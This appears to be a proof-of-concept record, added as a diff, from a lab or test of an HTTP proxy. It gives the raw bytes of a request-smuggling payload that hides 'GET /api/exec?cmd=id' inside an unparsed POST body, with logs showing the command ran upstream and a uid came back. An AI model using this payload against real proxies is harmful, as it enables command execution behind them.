@@ -1,0 +1,23 @@
+build        : 1cfd33433d25__44bf7f35
+upstream     : line-oriented lenient router; execs any well-formed /exec?cmd= line
+claim        : POST is accepted on a proxy location, but Content-Length is never parsed and the
+               body is never forwarded. The body is left in the parse buffer and re-parsed as the
+               next request, so the parent proxies it as its own request.
+
+single client write (bytes):
+b'POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nContent-Length: 51\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\n\r\nGET /hello.txt HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n'
+
+responses received: 3
+statuses: ['200 OK', '200 OK', '200 OK']
+upstream connections: 3
+  upstream #1 line0: b'POST /api/api/x HTTP/1.1'
+  upstream #1: ['request POST /api/api/x', '2 tokens', '2 tokens']
+  upstream #1 carried a body after header terminator: False
+  upstream #2 line0: b'GET /api/api/exec?cmd=id HTTP/1.1'
+  upstream #2: ['EXEC /api/api/exec?cmd=id', '2 tokens', '2 tokens']
+  upstream #2 carried a body after header terminator: False
+  upstream #3 line0: b'GET /api/hello.txt HTTP/1.1'
+  upstream #3: ['request GET /api/hello.txt', '2 tokens', '2 tokens']
+  upstream #3 carried a body after header terminator: False
+
+uid returned: True
